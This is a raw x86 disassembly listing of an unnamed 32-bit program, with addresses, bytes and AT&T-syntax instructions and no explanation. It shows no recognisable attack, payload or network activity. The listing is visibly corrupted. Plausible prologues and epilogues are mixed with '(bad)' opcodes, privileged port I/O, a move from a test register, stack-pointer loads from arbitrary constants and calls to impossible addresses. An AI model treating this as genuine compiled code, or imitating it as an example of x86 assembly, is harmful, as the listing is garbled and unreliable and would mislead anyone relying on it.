  40361d:	c8 03 fa 8b          	enter  $0xfa03,$0x8b
  403621:	55                   	push   %ebp
  403622:	87 13                	xchg   %edx,(%ebx)
  403624:	f9                   	stc
  403625:	8b 55 58             	mov    0x58(%ebp),%edx
  403628:	03 bb 8b 4d fc 89    	add    -0x7603b275(%ebx),%edi
  40362e:	b4 e0                	mov    $0xe0,%ah
  403630:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403633:	8b a3 04 13 d1 8b    	mov    -0x742eecfc(%ebx),%esp
  403639:	fd                   	std
  40363a:	f8                   	clc
  40363b:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40363e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403641:	83 c2 20             	add    $0x20,%edx
  403644:	49                   	dec    %ecx
  403645:	03 4d f8             	add    -0x8(%ebp),%ecx
  403648:	f9                   	stc
  403649:	84 d0                	test   %dl,%al
  40364b:	89 ed                	mov    %ebp,%ebp
  40364d:	f7 0f 85 4e ff ff    	testl  $0xffff4e85,(%edi)
  403653:	ff 81 c1 f4 01 00    	incl   0x1f4c1(%ecx)
  403659:	00 6a cd             	add    %ch,-0x33(%edx)
  40365c:	83 48 3c 68          	orl    $0x68,0x3c(%eax)
  403660:	e8 03 00 00 36       	call   0x36403668
  403665:	51                   	push   %ecx
  403666:	e4 25                	in     $0x25,%al
  403668:	61                   	popa
  403669:	c8 17 8b 4d          	enter  $0x8b17,$0x4d
  40366d:	dc 89 45 d0 8b f1    	fmull  -0xe742fbb(%ecx)
  403673:	d8 6a 00             	fsubrs 0x0(%edx)
  403676:	05 68 01 00 2a       	add    $0x2a000168,%eax
  40367b:	68 e8 03 9a 00       	push   $0x9a03e8
  403680:	83 d1 00             	adc    $0x0,%ecx
  403683:	fa                   	cli
  403684:	55                   	push   %ebp
  403685:	d4 ce                	aam    $0xce
  403687:	50                   	push   %eax
  403688:	e8 03 7f 00 99       	call   0x9940b590
  40368d:	97                   	xchg   %eax,%edi
  40368e:	4d                   	dec    %ebp
  40368f:	ef                   	out    %eax,(%dx)
  403690:	e7 45                	out    %eax,$0x45
  403692:	07                   	pop    %es
  403693:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403696:	6a 00                	push   $0x0
  403698:	05 08 01 a4 00       	add    $0xa40108,%eax
  40369d:	68 e8 03 29 00       	push   $0x2903e8
  4036a2:	83 d1 00             	adc    $0x0,%ecx
  4036a5:	89 55 dc             	mov    %edx,-0x24(%ebp)
  4036a8:	51                   	push   %ecx
  4036a9:	50                   	push   %eax
  4036aa:	18 e1                	sbb    %ah,%cl
  4036ac:	7e 00                	jle    0x4036ae
  4036ae:	00 8b 4d 5c 89 45    	add    %cl,0x45895c4d(%ebx)
  4036b4:	f0 8b 45 e8          	lock mov -0x18(%ebp),%eax
  4036b8:	84 00                	test   %al,(%eax)
  4036ba:	05 f4 01 00 00       	add    $0x1f4,%eax
  4036bf:	68 e8 03 e0 00       	push   $0xe003e8
  4036c4:	83 66 00 89          	andl   $0xffffff89,0x0(%esi)
  4036c8:	b3 f4                	mov    $0xf4,%bl
  4036ca:	51                   	push   %ecx
  4036cb:	50                   	push   %eax
  4036cc:	e8 bf 7e 00 00       	call   0x40b590
  4036d1:	aa                   	stos   %al,%es:(%edi)
  4036d2:	c7                   	(bad)
  4036d3:	f4                   	hlt
  4036d4:	01 00                	add    %eax,(%eax)
  4036d6:	00 6a 65             	add    %ch,0x65(%edx)
  4036d9:	83 d3 00             	adc    $0x0,%ebx
  4036dc:	68 e8 03 00 00       	push   $0x3e8
  4036e1:	53                   	push   %ebx
  4036e2:	57                   	push   %edi
  4036e3:	89 05 e8 89 55 ec    	mov    %eax,0xec5589e8
  4036e9:	e8 a2 10 00 00       	call   0x404790
  4036ee:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4036f1:	8b d8                	mov    %eax,%ebx
  4036f3:	4a                   	dec    %edx
  4036f4:	45                   	inc    %ebp
  4036f5:	e0 6a                	loopne 0x403761
  4036f7:	00 b7 f4 01 00 c2    	add    %dh,-0x3dfffe0c(%edi)
  4036fd:	68 e8 03 00 ee       	push   $0xee0003e8
  403702:	54                   	push   %esp
  403703:	d1 00                	roll   $1,(%eax)
  403705:	89 55 cc             	mov    %edx,-0x34(%ebp)
  403708:	51                   	push   %ecx
  403709:	50                   	push   %eax
  40370a:	e8 1a 7e 00 00       	call   0x40b529
  40370f:	89 cc                	mov    %ecx,%esp
  403711:	e0 a0                	loopne 0x4036b3
  403713:	0c 02                	or     $0x2,%al
  403715:	41                   	inc    %ecx
  403716:	00 85 c0 17 55 e4    	add    %al,-0x1baae840(%ebp)
  40371c:	fb                   	sti
  40371d:	8e 2a                	mov    (%edx),%gs
  40371f:	01 b4 00 8b 15 f0 17 	add    %esi,0x17f0158b(%eax,%eax,1)
  403726:	41                   	inc    %ecx
  403727:	00 a1 a8 0b 41 00    	add    %ah,0x410ba8(%ecx)
  40372d:	7a ee                	jp     0x40371d
  40372f:	68 2c e1 31 00       	push   $0x31e12c
  403734:	ff d6                	call   *%esi
  403736:	f1                   	int1
  403737:	f0 ba 41 00 8b 0d    	lock mov $0xd8b0041,%edx
  40373d:	a8 0b                	test   $0xb,%al
  40373f:	41                   	inc    %ecx
  403740:	49                   	dec    %ecx
  403741:	d1 50 50             	rcll   $1,0x50(%eax)
  403744:	86 10                	xchg   %dl,(%eax)
  403746:	68 d8 e0 40 00       	push   $0x40e0d8
  40374b:	ff                   	lcall  (bad)
  40374c:	da 8b 55 f4 8b 14    	fimull 0x148bf455(%ebx)
  403752:	f0 ba 3d f0 c0 dc    	lock mov $0xdcc0f03d,%edx
  403758:	00 5e c4             	add    %bl,-0x3c(%esi)
  40375b:	24 8b                	and    $0x8b,%al
  40375d:	4d                   	dec    %ebp
  40375e:	cc                   	int3
  40375f:	52                   	push   %edx
  403760:	50                   	push   %eax
  403761:	bc ac 02 41 00       	mov    $0x4102ac,%esp
  403766:	57                   	push   %edi
  403767:	99                   	cltd
  403768:	c7                   	(bad)
  403769:	50                   	push   %eax
  40376a:	51                   	push   %ecx
  40376b:	89 e8                	mov    %ebp,%eax
  40376d:	1f                   	pop    %ds
  40376e:	7e 00                	jle    0x403770
  403770:	52                   	push   %edx
  403771:	8b 0d a8 0b 41 00    	mov    0x410ba8,%ecx
  403777:	41                   	inc    %ecx
  403778:	8b 39                	mov    (%ecx),%edi
  40377a:	d4 c5                	aam    $0xc5
  40377c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40377f:	69 52 50 3c 57 51 14 	imul   $0x1451573c,0x50(%edx),%edx
  403786:	80 e0 40             	and    $0x40,%al
  403789:	65 f6 d6             	gs not %dh
  40378c:	a1 ac 02 41 00       	mov    0x4102ac,%eax
  403791:	8b 4d 43             	mov    0x43(%ebp),%ecx
  403794:	99                   	cltd
  403795:	8b f8                	mov    %eax,%edi
  403797:	8b 8f e8 1e cf 88    	mov    -0x7730e118(%edi),%ecx
  40379d:	2b dc                	sub    %esp,%ebx
  40379f:	00 4d ec             	add    %cl,-0x14(%ebp)
  4037a2:	f0 55                	lock push %ebp
  4037a4:	c4 1b                	les    (%ebx),%ebx
  4037a6:	4d                   	dec    %ebp
  4037a7:	f4                   	hlt
  4037a8:	51                   	push   %ecx
  4037a9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4037ac:	50                   	push   %eax
  4037ad:	a1 f0 17 31 00       	mov    0x3117f0,%eax
  4037b2:	50                   	push   %eax
  4037b3:	52                   	push   %edx
  4037b4:	a9 55 e0 57 51       	test   $0x5157e055,%eax
  4037b9:	ee                   	out    %al,(%dx)
  4037ba:	99                   	cltd
  4037bb:	d1 7d 00             	sarl   $1,0x0(%ebp)
  4037be:	00 8b ca 8b 55 34    	add    %cl,0x34558bca(%ebx)
  4037c4:	52                   	push   %edx
  4037c5:	8b 55 cc             	mov    -0x34(%ebp),%edx
  4037c8:	57                   	push   %edi
  4037c9:	52                   	push   %edx
  4037ca:	c1 89 45 f8 89 07 09 	rorl   $0x9,0x789f845(%ecx)
  4037d1:	f5                   	cmc
  4037d2:	ba 7d 00 00 8b       	mov    $0x8b00007d,%edx
  4037d7:	4d                   	dec    %ebp
  4037d8:	f8                   	clc
  4037d9:	2b c8                	sub    %eax,%ecx
  4037db:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4037de:	1b d1                	sbb    %ecx,%edx
  4037e0:	50                   	push   %eax
  4037e1:	a1 53 17 41 f3       	mov    0xf3411753,%eax
  4037e6:	51                   	push   %ecx
  4037e7:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  4037ea:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4037ed:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  4037f0:	8b 95 2b 02 ce c6    	mov    -0x3931fdd5(%ebp),%edx
  4037f6:	dc 1b                	fcompl (%ebx)
  4037f8:	d7                   	xlat   %ds:(%ebx)
  4037f9:	56                   	push   %esi
  4037fa:	52                   	push   %edx
  4037fb:	45                   	inc    %ebp
  4037fc:	50                   	push   %eax
  4037fd:	50                   	push   %eax
  4037fe:	a1 a8 0b 41 00       	mov    0x410ba8,%eax
  403803:	50                   	push   %eax
  403804:	68 20 e0 40 00       	push   $0x40e020
  403809:	bc d6 8b 4d 2e       	mov    $0x2e4d8bd6,%esp
  40380e:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403811:	a1 ac 63 41 00       	mov    0x4163ac,%eax
  403816:	8b 3d f0 f1 41 00    	mov    0x41f1f0,%edi
  40381c:	83 c4 30             	add    $0x30,%esp
  40381f:	51                   	push   %ecx
  403820:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403823:	52                   	push   %edx
  403824:	57                   	push   %edi
  403825:	99                   	cltd
  403826:	52                   	push   %edx
  403827:	50                   	push   %eax
  403828:	8b 39                	mov    (%ecx),%edi
  40382a:	e4 50                	in     $0x50,%al
  40382c:	86 5e 5e             	xchg   %bl,0x5e(%esi)
  40382f:	7d 00                	jge    0x403831
  403831:	32 52 8b             	xor    -0x75(%edx),%dl
  403834:	55                   	push   %ebp
  403835:	8f                   	(bad)
  403836:	22 a1 a8 0b 41 00    	and    0x410ba8(%ecx),%ah
  40383c:	57                   	push   %edi
  40383d:	52                   	push   %edx
  40383e:	53                   	push   %ebx
  40383f:	57                   	push   %edi
  403840:	47                   	inc    %edi
  403841:	50                   	push   %eax
  403842:	86 c8                	xchg   %cl,%al
  403844:	df 40 00             	filds  0x0(%eax)
  403847:	82 d6 83             	adc    $0x83,%dh
  40384a:	c4 30                	les    (%eax),%esi
  40384c:	68 b8 df 40 00       	push   $0x40dfb8
  403851:	db d6                	fcmovnbe %st(6),%st
  403853:	83 c4 04             	add    $0x4,%esp
  403856:	5f                   	pop    %edi
  403857:	5e                   	pop    %esi
  403858:	9b                   	fwait
  403859:	8b e5                	mov    %ebp,%esp
  40385b:	79 c3                	jns    0x403820
  40385d:	90                   	nop
  40385e:	90                   	nop
  40385f:	90                   	nop
  403860:	55                   	push   %ebp
  403861:	8b ec                	mov    %esp,%ebp
  403863:	83 f8 14             	cmp    $0x14,%eax
  403866:	66 03 02             	add    (%edx),%ax
  403869:	69 00 8b c8 10 d0    	imul   $0xd010c88b,(%eax),%eax
  40386f:	40                   	inc    %eax
  403870:	00 53 56             	add    %dl,0x56(%ebx)
  403873:	3b fc                	cmp    %esp,%edi
  403875:	57                   	push   %edi
  403876:	0f 8d fe 01 00 00    	jge    0x403a7a
  40387c:	8b 75 08             	mov    0x8(%ebp),%esi
  40387f:	c3                   	ret
  403880:	db 8b 06 89 5e 0c    	fisttpl 0xc5e8906(%ebx)
  403886:	0a 4b 89             	or     -0x77(%ebx),%cl
  403889:	22 f3                	and    %bl,%dh
  40388b:	ff 9e 60 08 00 00    	lcall  *0x860(%esi)
  403891:	b8 9e 20 08 00       	mov    $0x8209e,%eax
  403896:	00 84 9e 28 18 00 00 	add    %al,0x1828(%esi,%ebx,4)
  40389d:	89 5e 14             	mov    %ebx,0x14(%esi)
  4038a0:	74 08                	je     0x4038aa
  4038a2:	50                   	push   %eax
  4038a3:	e8 38 14 00 00       	call   0x404ce0
  4038a8:	29 0f                	sub    %ecx,(%edi)
  4038aa:	8b 0d 4c 40 41 00    	mov    0x41404c,%ecx
  4038b0:	53                   	push   %ebx
  4038b1:	53                   	push   %ebx
  4038b2:	51                   	push   %ecx
  4038b3:	56                   	push   %esi
  4038b4:	b3 db                	mov    $0xdb,%bl
  4038b6:	83 bc f6 8b 16 a1 fc 	cmpl   $0x6b,-0x35ee975(%esi,%esi,8)
  4038bd:	6b 
  4038be:	41                   	inc    %ecx
  4038bf:	00 80 53 8b 48 10    	add    %al,0x10488b53(%eax)
  4038c5:	8d 7e 38             	lea    0x38(%esi),%edi
  4038c8:	6a 01                	push   $0x1
  4038ca:	51                   	push   %ecx
  4038cb:	6b e8 1f             	imul   $0x1f,%eax,%ebp
  4038ce:	2d 00 6f 3b c3       	sub    $0xc33b6f00,%eax
  4038d3:	74 ca                	je     0x40389f
  4038d5:	7f 68                	jg     0x40393f
  4038d7:	38 e8                	cmp    %ch,%al
  4038d9:	40                   	inc    %eax
  4038da:	00 e8                	add    %ch,%al
  4038dc:	60                   	pusha
  4038dd:	e5 ff                	in     $0xff,%eax
  4038df:	ff 83 4c a9 8b 17    	incl   0x178ba94c(%ebx)
  4038e5:	6a 01                	push   $0x1
  4038e7:	66 08 52 ca          	data16 or %dl,-0x36(%edx)
  4038eb:	c1 54 00 00 0d       	rcll   $0xd,0x0(%eax,%eax,1)
  4038f0:	63 74 3b 50          	arpl   %esi,0x50(%ebx,%edi,1)
  4038f4:	68 28 e8 40 00       	push   $0x40e828
  4038f9:	e8 42 e5 ff ff       	call   0x401e40
  4038fe:	83 c4 7d             	add    $0x7d,%esp
  403901:	a1 6c f9 41 00       	mov    0x41f96c,%eax
  403906:	3b c3                	cmp    %ebx,%eax
  403908:	74 51                	je     0x40395b
  40390a:	50                   	push   %eax
  40390b:	8b b0 6a 40 50 e8    	mov    -0x17afbf96(%eax),%esi
  403911:	ea 54 00 00 3b c3 3f 	ljmp   $0x3fc3,$0x3b000054
  403918:	15 3d 87 11 01       	adc    $0x111873d,%eax
  40391d:	00 74 0e 50          	add    %dh,0x50(%esi,%ecx,1)
  403921:	84 14 e8             	test   %dl,(%eax,%ebp,8)
  403924:	40                   	inc    %eax
  403925:	00 e8                	add    %ch,%al
  403927:	15 e5 ec ff 83       	adc    $0x83ffece5,%eax
  40392c:	c4 08                	les    (%eax),%ecx
  40392e:	8b 0d 6c 02 22 31    	mov    0x3122026c,%ecx
  403934:	8b 94 51 68 80 00 00 	mov    0x8068(%ecx,%edx,2),%edx
  40393b:	00 52 e8             	add    %dl,-0x18(%edx)
  40393e:	6e                   	outsb  %ds:(%esi),(%dx)
  40393f:	c1 00 00             	roll   $0x0,(%eax)
  403942:	3b c3                	cmp    %ebx,%eax
  403944:	74 15                	je     0x40395b
  403946:	e7 87                	out    %eax,$0x87
  403948:	11 01                	adc    %eax,(%ecx)
  40394a:	00 74 0e b8          	add    %dh,-0x48(%esi,%ecx,1)
  40394e:	68 fc e7 40 00       	push   $0x40e7fc
  403953:	e8 e8 e4 ff b7       	call   0xb8401e40
  403958:	83 c4 5a             	add    $0x5a,%esp
  40395b:	e8 a0 30 00 64       	call   0x64406a00
  403960:	a3 a0 0b 41 00       	mov    %eax,0x410ba0
  403965:	89 15 a4 0b 41 00    	mov    %edx,0x410ba4
  40396b:	bc 17 89 86 30       	mov    $0x30868917,%esp
  403970:	08 00                	or     %al,(%eax)
  403972:	00 a1 a4 0b 73 00    	add    %ah,0x730ba4(%ecx)
  403978:	75 86                	jne    0x403900
  40397a:	34 08                	xor    $0x8,%al
  40397c:	00 00                	add    %al,(%eax)
  40397e:	8b 0d fc 17 41 00    	mov    0x4117fc,%ecx
  403984:	80 d0 e8             	adc    $0xe8,%al
  403987:	b5 87                	mov    $0x87,%ch
  403989:	00 00                	add    %al,(%eax)
  40398b:	8b d8                	mov    %eax,%ebx
  40398d:	46                   	inc    %esi
  40398e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40398f:	0f 8e c8 00 00 00    	jle    0x403a5d
  403995:	81 fb f1 75 09 87    	cmp    $0x870975f1,%ebx
  40399b:	0f 24 85             	mov    %tr0,%ebp
  40399e:	00 00                	add    %al,(%eax)
  4039a0:	00 81 fb b4 23 0b    	add    %al,0xb23b4fb(%ecx)
  4039a6:	00 74 7d 8b          	add    %dh,-0x75(%ebp,%edi,2)
  4039aa:	15 f8 17 41 00       	adc    $0x4117f8,%eax
  4039af:	90                   	nop
  4039b0:	07                   	pop    %es
  4039b1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4039b4:	c7 45 09 01 c0 00 00 	movl   $0xc001,0x9(%ebp)
  4039bb:	51                   	push   %ecx
  4039bc:	52                   	push   %edx
  4039bd:	89 dd                	mov    %ebx,%ebp
  4039bf:	f8                   	clc
  4039c0:	61                   	popa
  4039c1:	3b 28                	cmp    (%eax),%ebp
  4039c3:	be 00 b3 07 50       	mov    $0x5007b300,%esi
  4039c8:	e8 43 c3 00 00       	call   0x40fd10
  4039cd:	cc                   	int3
  4039ce:	3d c4 02 41 00       	cmp    $0x4102c4,%eax
  4039d3:	24 b8                	and    $0xb8,%al
  4039d5:	02 41 00             	add    0x0(%ecx),%al
  4039d8:	47                   	inc    %edi
  4039d9:	8b c8                	mov    %eax,%ecx
  4039db:	40                   	inc    %eax
  4039dc:	83 f9 44             	cmp    $0x44,%ecx
  4039df:	89 68 6e             	mov    %ebp,0x6e(%eax)
  4039e2:	02 41 00             	add    0x0(%ecx),%al
  4039e5:	a3 b8 02 41 00       	mov    %eax,0x4102b8
  4039ea:	7e 23                	jle    0x403a0f
  4039ec:	8b 15 0a c0 40 00    	mov    0x40c00a,%edx
  4039f2:	23 b0 d2 40 00 8e    	and    -0x71ffbf2e(%eax),%esi
  4039f8:	aa                   	stos   %al,%es:(%edi)
  4039f9:	40                   	inc    %eax
  4039fa:	52                   	push   %edx
  4039fb:	ff 15 ac c1 40 00    	call   *0x40c1ac
  403a01:	ef                   	out    %eax,(%dx)
  403a02:	68 98 d2 40 00       	push   $0x40d298
  403a07:	e8 34 e4 ff 51       	call   0x52401e40
  403a0c:	83 c4 10             	add    $0x10,%esp
  403a0f:	56                   	push   %esi
  403a10:	fe 46 08             	incb   0x8(%esi)
  403a13:	00 41 00             	add    %al,0x0(%ecx)
  403a16:	fc                   	cld
  403a17:	e8 44 fe dc ff       	call   0x1d3860
  403a1c:	83 07 04             	addl   $0x4,(%edi)
  403a1f:	83 5e f0 ea          	sbbl   $0xffffffea,-0x10(%esi)
  403a23:	e5 5d                	in     $0x5d,%eax
  403a25:	c3                   	ret
  403a26:	b8 01 00 00 00       	mov    $0x1,%eax
  403a2b:	c7 46 14 00 4d 00 00 	movl   $0x4d00,0x14(%esi)
  403a32:	89 46 08             	mov    %eax,0x8(%esi)
  403a35:	8b 15 f8 ca b8 8d    	mov    0x8db8caf8,%edx
  403a3b:	8d 23                	lea    (%ebx),%esp
  403a3d:	31 89 45 26 8b 8f    	xor    %ecx,-0x7074d9bb(%ecx)
  403a43:	48                   	dec    %eax
  403a44:	52                   	push   %edx
  403a45:	17                   	pop    %ss
  403a46:	c7 45 75 7c 77 89 45 	movl   $0x4589777c,0x75(%ebp)
  403a4d:	f8                   	clc
  403a4e:	d5 75                	aad    $0x75
  403a50:	fc                   	cld
  403a51:	e8 6a 26 00 00       	call   0x4060c0
  403a56:	5f                   	pop    %edi
  403a57:	87 5b 0f             	xchg   %ebx,0xf(%ebx)
  403a5a:	e5 67                	in     $0x67,%eax
  403a5c:	c3                   	ret
  403a5d:	c7 46 08 75 00 00 00 	movl   $0x75,0x8(%esi)
  403a64:	8b 15 a8 02 41 00    	mov    0x4102a8,%edx
  403a6a:	42                   	inc    %edx
  403a6b:	56                   	push   %esi
  403a6c:	89 15 ff 02 41 00    	mov    %edx,0x4102ff
  403a72:	e8 29 e4 ff ff       	call   0x401ea0
  403a77:	83 c4 04             	add    $0x4,%esp
  403a7a:	5f                   	pop    %edi
  403a7b:	28 5b 4b             	sub    %bl,0x4b(%ebx)
  403a7e:	e5 33                	in     $0x33,%eax
  403a80:	c3                   	ret
  403a81:	90                   	nop
  403a82:	90                   	nop
  403a83:	90                   	nop
  403a84:	13 90 90 90 a0 90    	adc    -0x6f5f6f70(%eax),%edx
  403a8a:	90                   	nop
  403a8b:	90                   	nop
  403a8c:	c0 90 90 90 8a 8b ec 	rclb   $0xec,-0x74756f70(%eax)
  403a93:	83 8c 14 56 8b 75 08 	orl    $0x57,0x8758b56(%esp,%edx,1)
  403a9a:	57 
  403a9b:	8b 46 0c             	mov    0xc(%esi),%eax
  403a9e:	85 c0                	test   %eax,%eax
  403aa0:	75 22                	jne    0x403ac4
  403aa2:	8f 86 24 08 00 00    	pop    0x824(%esi)
  403aa8:	85 f5                	test   %esi,%ebp
  403aaa:	2c 45                	sub    $0x45,%al
  403aac:	cf                   	iret
  403aad:	b4 65                	mov    $0x65,%ah
  403aaf:	41                   	inc    %ecx
  403ab0:	00 85 ee 0f 84 c6    	add    %al,-0x397bf012(%ebp)
  403ab6:	01 00                	add    %eax,(%eax)
  403ab8:	00 48 53             	add    %cl,0x53(%eax)
  403abb:	b4 02                	mov    $0x2,%ah
  403abd:	41                   	inc    %ecx
  403abe:	d5 e9                	aad    $0xe9
  403ac0:	61                   	popa
  403ac1:	01 00                	add    %eax,(%eax)
  403ac3:	00 83 dc b4 02 41    	add    %al,0x4102b4dc(%ebx)
  403ac9:	3f                   	aas
  403aca:	01 75 0a             	add    %esi,0xa(%ebp)
  403acd:	8b 46 10             	mov    0x10(%esi),%eax
  403ad0:	a3 33 02 41 00       	mov    %eax,0x410233
  403ad5:	eb 24                	jmp    0x403afb
  403ad7:	8b 4e 10             	mov    0x10(%esi),%ecx
  403ada:	a1 8c 02 e3 00       	mov    0xe3028c,%eax
  403adf:	3b c8                	cmp    %eax,%ecx
  403ae1:	74 ab                	je     0x403a8e
  403ae3:	8b 0d b8 02 28 00    	mov    0x2802b8,%ecx
  403ae9:	a1 c0 02 41 00       	mov    0x4102c0,%eax
  403aee:	41                   	inc    %ecx
  403aef:	40                   	inc    %eax
  403af0:	9a 0d b8 5d 41 00 a3 	lcall  $0xa300,$0x415db80d
  403af7:	ad                   	lods   %ds:(%esi),%eax
  403af8:	02 41 00             	add    0x0(%ecx),%al
  403afb:	a1 ac 1c 41 00       	mov    0x411cac,%eax
  403b00:	8b 0d 10 d0 40 00    	mov    0x40d010,%ecx
  403b06:	3b c1                	cmp    %ecx,%eax
  403b08:	0f fa 17             	psubd  (%edi),%mm2
  403b0b:	01 00                	add    %eax,(%eax)
  403b0d:	00 8b 21 f1 0b 41    	add    %cl,0x410bf121(%ebx)
  403b13:	00 18                	add    %bl,(%eax)
  403b15:	f8                   	clc
  403b16:	c1 5a 6d d9          	rcrl   $0xd9,0x6d(%edx)
  403b1a:	fa                   	cli
  403b1b:	40                   	inc    %eax
  403b1c:	a3 ac 02 41 00       	mov    %eax,0x4102ac
  403b21:	e8 da 52 00 00       	call   0x408e00
  403b26:	ff a0 0b 41 00 89    	jmp    *-0x76ffbef5(%eax)
  403b2c:	15 6d 0b 41 71       	adc    $0x71410b6d,%eax
  403b31:	90                   	nop
  403b32:	86 50 08             	xchg   %dl,0x8(%eax)
  403b35:	00 00                	add    %al,(%eax)
  403b37:	8b 82 75 0b 99 00    	mov    0x990b75(%edx),%eax
  403b3d:	8b 86 30 08 00 00    	mov    0x830(%esi),%eax
  403b43:	89 96 54 08 00 9a    	mov    %edx,-0x65fff7ac(%esi)
  403b49:	89 07                	mov    %eax,(%edi)
  403b4b:	48                   	dec    %eax
  403b4c:	8e 34 f1             	mov    (%ecx,%esi,8),%?
  403b4f:	00 0f                	add    %cl,(%edi)
  403b51:	89 4f 04             	mov    %ecx,0x4(%edi)
  403b54:	8b 8e 38 08 74 00    	mov    0x740838(%esi),%ecx
  403b5a:	8b 86 30 08 00 00    	mov    0x830(%esi),%eax
  403b60:	8b 96 34 08 b1 00    	mov    0xb10834(%esi),%edx
  403b66:	ce                   	into
  403b67:	c8 8b 86 03          	enter  $0x868b,$0x3
  403b6b:	08 00                	or     %al,(%eax)
  403b6d:	05 1b c2 85 c0       	add    $0xc085c21b,%eax
  403b72:	7f f9                	jg     0x403b6d
  403b74:	3b 04 85 5b 73 04 33 	cmp    0x3304735b(,%eax,4),%eax
  403b7b:	56                   	push   %esi
  403b7c:	33 c0                	xor    %eax,%eax
  403b7e:	6b ed 8f             	imul   $0xffffff8f,%ebp,%ebp
  403b81:	93                   	xchg   %eax,%ebx
  403b82:	47                   	inc    %edi
  403b83:	14 8b                	adc    $0x8b,%al
  403b85:	24 50                	and    $0x50,%al
  403b87:	08 00                	or     %al,(%eax)
  403b89:	00 8b 86 30 08 00    	add    %cl,0x83086(%ebx)
  403b8f:	00 8b 96 34 08 00    	add    %cl,0x83496(%ebx)
  403b95:	00 2b                	add    %ch,(%ebx)
  403b97:	07                   	pop    %es
  403b98:	8b 86 54 08 00 00    	mov    0x854(%esi),%eax
  403b9e:	1b c2                	sbb    %edx,%eax
  403ba0:	85 c0                	test   %eax,%eax
  403ba2:	7f 0a                	jg     0x403bae
  403ba4:	e8 c6 85 df 73       	call   0x741fc16f
  403ba9:	b5 33                	mov    $0x33,%ch
  403bab:	c9                   	leave
  403bac:	33 c0                	xor    %eax,%eax
  403bae:	89 4f 18             	mov    %ecx,0x18(%edi)
  403bb1:	89 47 1c             	mov    %eax,0x1c(%edi)
  403bb4:	8b 3d 48 08 00 00    	mov    0x848,%edi
  403bba:	8b 86 5e 08 00 7a    	mov    0x7a00085e(%esi),%eax
  403bc0:	8b 96 44 08 00 00    	mov    0x844(%esi),%edx
  403bc6:	2b c8                	sub    %eax,%ecx
  403bc8:	c3                   	ret
  403bc9:	86 4c 08 00          	xchg   %cl,0x0(%eax,%ecx,1)
  403bcd:	00 1b                	add    %bl,(%ebx)
  403bcf:	c2 85 c0             	ret    $0xc085
  403bd2:	7f 90                	jg     0x403b64
  403bd4:	90                   	nop
  403bd5:	04 0c                	add    $0xc,%al
  403bd7:	c9                   	leave
  403bd8:	73 04                	jae    0x403bde
  403bda:	33 c9                	xor    %ecx,%ecx
  403bdc:	33 89 89 4f f2 3c    	xor    0x3cf24f89(%ecx),%ecx
  403be2:	47                   	inc    %edi
  403be3:	0c 8b                	or     $0x8b,%al
  403be5:	59                   	pop    %ecx
  403be6:	14 d0                	adc    $0xd0,%al
  403be8:	40                   	inc    %eax
  403be9:	00 85 c9 74 37 8b    	add    %al,-0x74c88b37(%ebp)
  403bef:	4b                   	dec    %ebx
  403bf0:	ac                   	lods   %ds:(%esi),%al
  403bf1:	9f                   	lahf
  403bf2:	41                   	inc    %ecx
  403bf3:	00 8b c7 99 f7 f9    	add    %cl,-0x6086639(%ebx)
  403bf9:	85 d2                	test   %edx,%edx
  403bfb:	75 28                	jne    0x403c25
  403bfd:	8b c1                	mov    %ecx,%eax
  403bff:	c8 c0 40 00          	enter  $0x40c0,$0x0
  403c03:	57                   	push   %edi
  403c04:	d1 5a 84             	rcrl   $1,-0x7c(%edx)
  403c07:	f3 40                	repz inc %eax
  403c09:	e8 40 00 52 ff       	call   0xff923c4e
  403c0e:	15 fa c1 40 00       	adc    $0x40c1fa,%eax
  403c13:	a1 c8 c0 40 7a       	mov    0x7a40c0c8,%eax
  403c18:	83 c0 40             	add    $0x40,%eax
  403c1b:	50                   	push   %eax
  403c1c:	ff 14 27             	call   *(%edi,%eiz,1)
  403c1f:	c1 40 00 83          	roll   $0x83,0x0(%eax)
  403c23:	47                   	inc    %edi
  403c24:	99                   	cltd
  403c25:	a1 f8 17 41 a9       	mov    0xa94117f8,%eax
  403c2a:	8b dc                	mov    %esp,%ebx
  403c2c:	04 8d                	add    $0x8d,%al
  403c2e:	55                   	push   %ebp
  403c2f:	ec                   	in     (%dx),%al
  403c30:	c7                   	(bad)
  403c31:	1f                   	pop    %ds
  403c32:	f0 1c 00             	lock sbb $0x0,%al
  403c35:	00 00                	add    %al,(%eax)
  403c37:	52                   	push   %edx
  403c38:	07                   	pop    %es
  403c39:	89 87 f8 4b bf 50    	mov    %eax,0x50bf4bf8(%edi)
  403c3f:	00 00                	add    %al,(%eax)
  403c41:	df 4e 65             	fisttps 0x65(%esi)
  403c44:	bc e8 b9 21 00       	mov    $0x21b9e8,%esp
  403c49:	00 56 c7             	add    %dl,-0x39(%esi)
  403c4c:	74 94                	je     0x403be2
  403c4e:	00 00                	add    %al,(%eax)
  403c50:	00 00                	add    %al,(%eax)
  403c52:	9e                   	sahf
  403c53:	88 db                	mov    %bl,%bl
  403c55:	ff                   	(bad)
  403c56:	ff                   	(bad)
  403c57:	79 c4                	jns    0x403c1d
  403c59:	80 5f 43 8b          	sbbb   $0x8b,0x43(%edi)
  403c5d:	a9 5d 0b 55 8b       	test   $0x8b550b5d,%eax
  403c62:	ec                   	in     (%dx),%al
  403c63:	81 ec a0 9c 00 00    	sub    $0x9ca0,%esp
  403c69:	9c                   	pushf
  403c6a:	8b cf                	mov    %edi,%ecx
  403c6c:	08 56 8d             	or     %dl,-0x73(%esi)
  403c6f:	00 eb                	add    %ch,%bl
  403c71:	8b 4b 71             	mov    0x71(%ebx),%ecx
  403c74:	94                   	xchg   %eax,%esp
  403c75:	42                   	inc    %edx
  403c76:	68 20 18 41 98       	push   $0x98411820
  403c7b:	51                   	push   %ecx
  403c7c:	5d                   	pop    %ebp
  403c7d:	aa                   	stos   %al,%es:(%edi)
  403c7e:	fc                   	cld
  403c7f:	12 20                	adc    (%eax),%ah
